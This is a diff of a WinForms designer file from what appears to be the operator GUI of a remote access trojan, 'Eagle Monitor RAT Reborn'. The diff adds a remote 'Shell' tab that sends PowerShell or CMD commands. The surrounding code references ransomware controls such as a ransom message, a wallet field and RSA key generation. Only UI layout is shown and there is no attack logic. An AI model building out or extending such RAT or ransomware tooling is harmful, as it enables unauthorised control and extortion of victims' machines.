@@ -359,6 +359,13 @@
             this.startDecryptionGuna2Button = new Guna.UI2.WinForms.Guna2Button();
             this.startEncryptionGuna2Button = new Guna.UI2.WinForms.Guna2Button();
             this.generateRSAKeyGuna2Button = new Guna.UI2.WinForms.Guna2Button();
+            this.tabPage29 = new System.Windows.Forms.TabPage();
+            this.panel21 = new System.Windows.Forms.Panel();
+            this.remoteShellStdOutRichTextBox = new System.Windows.Forms.RichTextBox();
+            this.remoteShellGuna2ToggleSwitch = new Guna.UI2.WinForms.Guna2ToggleSwitch();
+            this.label11 = new System.Windows.Forms.Label();
+            this.remoteShellGuna2TextBox = new Guna.UI2.WinForms.Guna2TextBox();
+            this.remoteShellGuna2Button = new Guna.UI2.WinForms.Guna2Button();
             this.ransomwareContextMenuStrip = new Eagle_Monitor_RAT_Reborn.Controls.CustomContextMenuStrip();
             this.removePathToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.logoPictureBox = new System.Windows.Forms.PictureBox();
@@ -367,6 +374,7 @@
             this.bytesSentlabel = new System.Windows.Forms.Label();
             this.bytesReceivedLabel = new System.Windows.Forms.Label();
             this.panel7 = new System.Windows.Forms.Panel();
+            this.toolTip1 = new System.Windows.Forms.ToolTip(this.components);
             this.mainGuna2TabControl.SuspendLayout();
             this.tabPage1.SuspendLayout();
             this.recoveryGuna2TabControl.SuspendLayout();
@@ -463,6 +471,8 @@
             ((System.ComponentModel.ISupportInitialize)(this.extensionRansomwareDataGridView)).BeginInit();
             this.extensionContextMenuStrip.SuspendLayout();
             this.tabPage28.SuspendLayout();
+            this.tabPage29.SuspendLayout();
+            this.panel21.SuspendLayout();
             this.ransomwareContextMenuStrip.SuspendLayout();
             ((System.ComponentModel.ISupportInitialize)(this.logoPictureBox)).BeginInit();
             this.panel6.SuspendLayout();
@@ -527,6 +537,7 @@
             this.mainGuna2TabControl.Controls.Add(this.tabPage14);
             this.mainGuna2TabControl.Controls.Add(this.tabPage24);
             this.mainGuna2TabControl.Controls.Add(this.tabPage25);
+            this.mainGuna2TabControl.Controls.Add(this.tabPage29);
             this.mainGuna2TabControl.Dock = System.Windows.Forms.DockStyle.Fill;
             this.mainGuna2TabControl.ItemSize = new System.Drawing.Size(180, 40);
             this.mainGuna2TabControl.Location = new System.Drawing.Point(0, 0);
@@ -4502,6 +4513,121 @@
             this.generateRSAKeyGuna2Button.Text = "Generate RSA key";
             this.generateRSAKeyGuna2Button.Click += new System.EventHandler(this.generateRSAKeyGuna2Button_Click);
             // 
+            // tabPage29
+            // 
+            this.tabPage29.Controls.Add(this.panel21);
+            this.tabPage29.Controls.Add(this.remoteShellGuna2ToggleSwitch);
+            this.tabPage29.Controls.Add(this.label11);
+            this.tabPage29.Controls.Add(this.remoteShellGuna2TextBox);
+            this.tabPage29.Controls.Add(this.remoteShellGuna2Button);
+            this.tabPage29.Location = new System.Drawing.Point(4, 4);
+            this.tabPage29.Name = "tabPage29";
+            this.tabPage29.Padding = new System.Windows.Forms.Padding(3);
+            this.tabPage29.Size = new System.Drawing.Size(1091, 474);
+            this.tabPage29.TabIndex = 7;
+            this.tabPage29.Text = "Shell";
+            this.tabPage29.UseVisualStyleBackColor = true;
+            // 
+            // panel21
+            // 
+            this.panel21.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
+            | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.panel21.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
+            this.panel21.Controls.Add(this.remoteShellStdOutRichTextBox);
+            this.panel21.Location = new System.Drawing.Point(6, 6);
+            this.panel21.Name = "panel21";
+            this.panel21.Padding = new System.Windows.Forms.Padding(3);
+            this.panel21.Size = new System.Drawing.Size(1079, 399);
+            this.panel21.TabIndex = 66;
+            // 
+            // remoteShellStdOutRichTextBox
+            // 
+            this.remoteShellStdOutRichTextBox.BackColor = System.Drawing.Color.White;
+            this.remoteShellStdOutRichTextBox.BorderStyle = System.Windows.Forms.BorderStyle.None;
+            this.remoteShellStdOutRichTextBox.Dock = System.Windows.Forms.DockStyle.Fill;
+            this.remoteShellStdOutRichTextBox.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.remoteShellStdOutRichTextBox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(100)))), ((int)(((byte)(100)))));
+            this.remoteShellStdOutRichTextBox.Location = new System.Drawing.Point(3, 3);
+            this.remoteShellStdOutRichTextBox.Name = "remoteShellStdOutRichTextBox";
+            this.remoteShellStdOutRichTextBox.ReadOnly = true;
+            this.remoteShellStdOutRichTextBox.ScrollBars = System.Windows.Forms.RichTextBoxScrollBars.Vertical;
+            this.remoteShellStdOutRichTextBox.Size = new System.Drawing.Size(1073, 393);
+            this.remoteShellStdOutRichTextBox.TabIndex = 55;
+            this.remoteShellStdOutRichTextBox.Text = "";
+            this.remoteShellStdOutRichTextBox.TextChanged += new System.EventHandler(this.remoteShellStdOutRichTextBox_TextChanged);
+            // 
+            // remoteShellGuna2ToggleSwitch
+            // 
+            this.remoteShellGuna2ToggleSwitch.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
+            this.remoteShellGuna2ToggleSwitch.Animated = true;
+            this.remoteShellGuna2ToggleSwitch.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(151)))), ((int)(((byte)(249)))));
+            this.remoteShellGuna2ToggleSwitch.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(151)))), ((int)(((byte)(249)))));
+            this.remoteShellGuna2ToggleSwitch.CheckedState.InnerBorderColor = System.Drawing.Color.White;
+            this.remoteShellGuna2ToggleSwitch.CheckedState.InnerColor = System.Drawing.Color.White;
+            this.remoteShellGuna2ToggleSwitch.Location = new System.Drawing.Point(96, 408);
+            this.remoteShellGuna2ToggleSwitch.Name = "remoteShellGuna2ToggleSwitch";
+            this.remoteShellGuna2ToggleSwitch.Size = new System.Drawing.Size(35, 20);
+            this.remoteShellGuna2ToggleSwitch.TabIndex = 64;
+            this.toolTip1.SetToolTip(this.remoteShellGuna2ToggleSwitch, "CMD is the default program to run command.");
+            this.remoteShellGuna2ToggleSwitch.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(190)))), ((int)(((byte)(190)))), ((int)(((byte)(190)))));
+            this.remoteShellGuna2ToggleSwitch.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(190)))), ((int)(((byte)(190)))), ((int)(((byte)(190)))));
+            this.remoteShellGuna2ToggleSwitch.UncheckedState.InnerBorderColor = System.Drawing.Color.White;
+            this.remoteShellGuna2ToggleSwitch.UncheckedState.InnerColor = System.Drawing.Color.White;
+            // 
+            // label11
+            // 
+            this.label11.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
+            this.label11.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(100)))), ((int)(((byte)(100)))));
+            this.label11.Location = new System.Drawing.Point(9, 408);
+            this.label11.Name = "label11";
+            this.label11.Size = new System.Drawing.Size(68, 20);
+            this.label11.TabIndex = 65;
+            this.label11.Text = "Powershell :";
+            this.label11.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
+            // 
+            // remoteShellGuna2TextBox
+            // 
+            this.remoteShellGuna2TextBox.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.remoteShellGuna2TextBox.Cursor = System.Windows.Forms.Cursors.IBeam;
+            this.remoteShellGuna2TextBox.DefaultText = "";
+            this.remoteShellGuna2TextBox.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
+            this.remoteShellGuna2TextBox.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
+            this.remoteShellGuna2TextBox.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
+            this.remoteShellGuna2TextBox.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
+            this.remoteShellGuna2TextBox.Enabled = false;
+            this.remoteShellGuna2TextBox.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
+            this.remoteShellGuna2TextBox.Font = new System.Drawing.Font("Segoe UI", 9F);
+            this.remoteShellGuna2TextBox.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
+            this.remoteShellGuna2TextBox.Location = new System.Drawing.Point(137, 434);
+            this.remoteShellGuna2TextBox.Multiline = true;
+            this.remoteShellGuna2TextBox.Name = "remoteShellGuna2TextBox";
+            this.remoteShellGuna2TextBox.PasswordChar = '\0';
+            this.remoteShellGuna2TextBox.PlaceholderText = "whoami";
+            this.remoteShellGuna2TextBox.SelectedText = "";
+            this.remoteShellGuna2TextBox.Size = new System.Drawing.Size(948, 34);
+            this.remoteShellGuna2TextBox.TabIndex = 1;
+            this.remoteShellGuna2TextBox.KeyDown += new System.Windows.Forms.KeyEventHandler(this.remoteShellGuna2TextBox_KeyDown);
+            // 
+            // remoteShellGuna2Button
+            // 
+            this.remoteShellGuna2Button.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
+            this.remoteShellGuna2Button.Animated = true;
+            this.remoteShellGuna2Button.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
+            this.remoteShellGuna2Button.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
+            this.remoteShellGuna2Button.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
+            this.remoteShellGuna2Button.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
+            this.remoteShellGuna2Button.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(151)))), ((int)(((byte)(249)))));
+            this.remoteShellGuna2Button.Font = new System.Drawing.Font("Segoe UI", 9F);
+            this.remoteShellGuna2Button.ForeColor = System.Drawing.Color.White;
+            this.remoteShellGuna2Button.Location = new System.Drawing.Point(6, 434);
+            this.remoteShellGuna2Button.Name = "remoteShellGuna2Button";
+            this.remoteShellGuna2Button.Size = new System.Drawing.Size(125, 34);
+            this.remoteShellGuna2Button.TabIndex = 54;
+            this.remoteShellGuna2Button.Text = "Start Session";
+            this.remoteShellGuna2Button.Click += new System.EventHandler(this.remoteShellGuna2Button_Click);
+            // 
             // ransomwareContextMenuStrip
             // 
             this.ransomwareContextMenuStrip.ImageScalingSize = new System.Drawing.Size(28, 28);
@@ -4714,6 +4840,8 @@
             ((System.ComponentModel.ISupportInitialize)(this.extensionRansomwareDataGridView)).EndInit();
             this.extensionContextMenuStrip.ResumeLayout(false);
             this.tabPage28.ResumeLayout(false);
+            this.tabPage29.ResumeLayout(false);
+            this.panel21.ResumeLayout(false);
             this.ransomwareContextMenuStrip.ResumeLayout(false);
             ((System.ComponentModel.ISupportInitialize)(this.logoPictureBox)).EndInit();
             this.panel6.ResumeLayout(false);
@@ -5002,6 +5130,14 @@
         private Guna.UI2.WinForms.Guna2Button generateRSAKeyGuna2Button;
         internal Guna.UI2.WinForms.Guna2TextBox msgRansomwareGuna2TextBox;
         internal Guna.UI2.WinForms.Guna2TextBox walletGuna2TextBox;
+        private System.Windows.Forms.TabPage tabPage29;
+        private Guna.UI2.WinForms.Guna2Button remoteShellGuna2Button;
+        public System.Windows.Forms.RichTextBox remoteShellStdOutRichTextBox;
+        private System.Windows.Forms.Label label11;
+        internal Guna.UI2.WinForms.Guna2TextBox remoteShellGuna2TextBox;
+        internal Guna.UI2.WinForms.Guna2ToggleSwitch remoteShellGuna2ToggleSwitch;
+        private System.Windows.Forms.Panel panel21;
+        private System.Windows.Forms.ToolTip toolTip1;
     }
 }
 
